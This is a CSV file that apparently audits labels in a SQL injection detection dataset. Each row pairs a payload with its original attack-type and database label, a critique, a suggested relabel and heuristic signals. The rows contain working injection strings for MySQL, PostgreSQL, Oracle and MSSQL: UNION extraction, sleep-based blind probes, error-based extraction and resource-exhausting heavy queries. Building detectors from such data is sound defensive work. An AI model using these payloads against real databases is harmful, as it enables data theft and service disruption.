payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,oracle,"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" ) as ivkw where 4218 = 4218 union all select null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) as ivkw where 4218 = 4218 union all select null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"1"" ) where 2088 = 2088 union all select null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) where 2088 = 2088 union all select null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-2230%"" union all select 3303,3303,3303--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2230%"" union all select 3303,3303,3303--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",False,0,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
1' where 9242 = 9242,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' where 9242 = 9242,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"-5235 ) or make_set ( 9354 = 9354,7185 )",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-5235 ) or make_set ( 9354 = 9354,7185 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"-9820"" or 1038 = 7502#",boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,"-9820"" or 1038 = 7502#",False,0,boolean_blind,generic,Pattern match: 'or 1038 = 7502' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",boolean_blind,generic,0.5,and_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",False,0,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,False,0,boolean_blind,generic,Pattern match: 'or 3958 = 5536' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,postgresql,"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-2840' ) ) ) union all select 3025,3025,3025,3025--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2840' ) ) ) union all select 3025,3025,3025,3025--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
select case when 5346 = 8272 then 1 else null end--,boolean_blind,generic,0.5,case_null,RELABEL,reasoning too short (9 chars); confidence too low (0.50),boolean_blind,generic,select case when 5346 = 8272 then 1 else null end--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select sleep ( 5 ) and ""oivc"" like ""oivc",time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,"select sleep ( 5 ) and ""oivc"" like ""oivc",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1' ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"1%' union all select null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
1' ) as imgv where 7802 = 7802,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) as imgv where 7802 = 7802,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,boolean_blind,generic,0.5,inequality,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,False,0,boolean_blind,generic,Pattern match: 'and 5498 = 5777' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",boolean_blind,mysql,0.7,row_count,RELABEL,reasoning too short (9 chars),boolean_blind,mysql,"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%' union all select null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' union all select null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-4072%"" ) ) ) or 3999 = 1979",boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,"-4072%"" ) ) ) or 3999 = 1979",False,0,boolean_blind,generic,Pattern match: 'or 3999 = 1979' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" and sleep ( 5 ) #",time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,"1"" and sleep ( 5 ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.7,count_concat,RELABEL,reasoning too short (12 chars),boolean_blind,mysql,"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.7,row_count,RELABEL,reasoning too short (9 chars),boolean_blind,mysql,"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' in boolean mode ) waitfor delay '0:0:5'--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,1' in boolean mode ) waitfor delay '0:0:5'--,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1%"" ) ) ) union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" ) ) ) union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,oracle,"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
